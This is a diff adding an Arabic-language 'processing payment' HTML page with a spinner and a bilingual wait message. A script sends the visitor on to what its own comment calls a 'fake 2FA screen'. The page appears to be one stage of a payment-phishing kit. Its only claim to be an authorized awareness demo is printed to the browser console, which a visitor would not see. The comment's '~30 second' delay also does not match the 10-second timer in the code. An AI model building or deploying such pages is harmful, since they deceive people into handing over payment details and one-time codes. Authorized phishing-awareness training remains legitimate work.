@@ -1,0 +1,46 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex, nofollow">
+<title>جارٍ معالجة الدفع</title>
+<style>
+@font-face{font-family:Parastoo;font-style:normal;font-weight:500;src:url("https://wahastories.com/wp-content/uploads/2026/07/Parastoo-Medium.ttf") format("truetype");font-display:swap}
+*{box-sizing:border-box}
+html,body{margin:0;padding:0;height:100%}
+body{
+  background:#f4f6f8;color:#1f2937;min-height:100vh;display:flex;flex-direction:column;
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;direction:rtl;
+}
+.load-main{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;text-align:center;padding:40px 24px}
+.spinner{width:72px;height:72px;border-radius:50%;border:6px solid #dfe6ec;border-top-color:#3b5647;animation:spin 1s linear infinite;margin-bottom:28px}
+@keyframes spin{to{transform:rotate(360deg)}}
+.load-main h1{font-family:Parastoo,serif;font-weight:500;font-size:26px;color:#3b5647;margin:0 0 10px}
+.load-main p{font-size:15px;color:#5b6b62;margin:0}
+.load-main .en{font-size:13px;color:#9aa6a0;margin-top:6px;direction:ltr}
+.dots::after{content:"";animation:dots 1.4s steps(4,end) infinite}
+@keyframes dots{0%{content:""}25%{content:"."}50%{content:".."}75%{content:"..."}100%{content:""}}
+</style>
+</head>
+<body>
+<main class="load-main">
+  <div class="spinner" aria-hidden="true"></div>
+  <h1>جارٍ معالجة الدفع<span class="dots"></span></h1>
+  <p>يرجى الانتظار وعدم إغلاق الصفحة أو الضغط على زر الرجوع.</p>
+  <p class="en">Processing payment, please wait…</p>
+</main>
+<script>
+console.log(
+ "%c⚠ DZEUF Ethical Security School — Security-Awareness Demonstration",
+ "font-size:15px;font-weight:bold;color:#fff;background:#b91c1c;padding:6px 12px;border-radius:4px");
+console.log(
+ "%cControlled phishing-awareness demo for authorized students only. No real payment is processed.n"+
+ "هذه صفحة تدريبية — لا تُدخل بيانات حقيقية.",
+ "font-size:13px;color:#b91c1c;line-height:1.6");
+
+/* ~30 second "processing", then move to the fake 2FA screen */
+setTimeout(function(){ window.location.href = "/2fa/"; }, 10000);
+</script>
+</body>
+</html>
